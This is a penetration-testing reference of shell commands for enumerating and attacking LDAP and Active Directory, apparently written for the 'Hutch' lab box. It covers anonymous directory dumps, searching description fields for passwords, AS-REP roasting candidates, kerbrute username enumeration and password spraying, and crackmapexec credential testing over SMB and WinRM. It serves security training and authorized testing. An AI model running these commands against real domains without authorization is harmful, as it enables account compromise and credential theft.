# LDAP Enumeration & Attack Reference

This document contains commands for enumerating and attacking LDAP/Active
Directory during penetration tests.

---

## 1. LDAP Reconnaissance

### Initial Scanning

```bash
# Comprehensive LDAP scanning with nmap
nmap --script "ldap*" $IP -p 389,636,3268,3269 > ldap_scan.log
```

### Null Bind Enumeration

```bash
# Anonymous/null bind to extract all directory data
ldapsearch -x -H ldap://$IP -b "dc=hutch,dc=offsec"

# For specific attributes
ldapsearch -x -H ldap://$IP -b "dc=hutch,dc=offsec" -s sub "objectclass=*" sAMAccountName userPrincipalName description
```

---

## 2. Data Analysis & Extraction

### User Account Enumeration

```bash
# Extract all sAMAccountNames
cat ldap_users | grep sAMAccountName

# Clean extraction of usernames only
cat ldap_users | grep sAMAccountName | cut -d ":" -f 2 | tr -d " "
```

### Finding Sensitive Information

```bash
# Look for passwords or hints in description/info fields
cat ldap_users | grep -E "sAMAccountName|description|info" -A 1

# Find accounts not requiring Kerberos pre-authentication (AS-REP Roasting candidates)
cat ldap_users | grep -i "DONT_REQ_PREAUTH\|NOT_REQUIRED_PREAUTH"
```

---

## 3. Kerberos Attacks

### Username Verification with Kerbrute

```bash
# Verify usernames against domain controller
kerbrute userenum --dc hutchdc.hutch.offsec -d hutch.offsec users
```

### Password Spraying with Kerbrute

```bash
# Test single password against user list
kerbrute passwordspray -d hutch.offsec ./path/to/userlist <password to use> --dc hutchdc.hutch.offsec
```

---

## 4. Authentication Testing

### SMB Authentication with Crackmapexec

```bash
# Test username/password combinations against SMB
crackmapexec smb $IP -u ./users -p ./passwords
```

### WinRM Authentication with Crackmapexec

```bash
# Test username/password combinations against WinRM
crackmapexec winrm $IP -u ./users -p ./passwords
```

---

## 5. Additional LDAP Techniques

### Targeted LDAP Queries

```bash
# Find all domain administrators
ldapsearch -x -H ldap://$IP -D "<username>@<domain>" -w "<password>" -b "dc=domain,dc=local" -s sub "(&(objectCategory=person)(memberOf=CN=Domain Admins,CN=Users,DC=domain,DC=local))"

# Find all computers
ldapsearch -x -H ldap://$IP -D "<username>@<domain>" -w "<password>" -b "dc=domain,dc=local" -s sub "(objectClass=computer)"
```

### LDAP Search with Credentials

```bash
# Authenticated LDAP search
ldapsearch -x -H ldap://$IP -D "cn=binduser,ou=users,dc=domain,dc=local" -w "password" -b "dc=domain,dc=local"
```
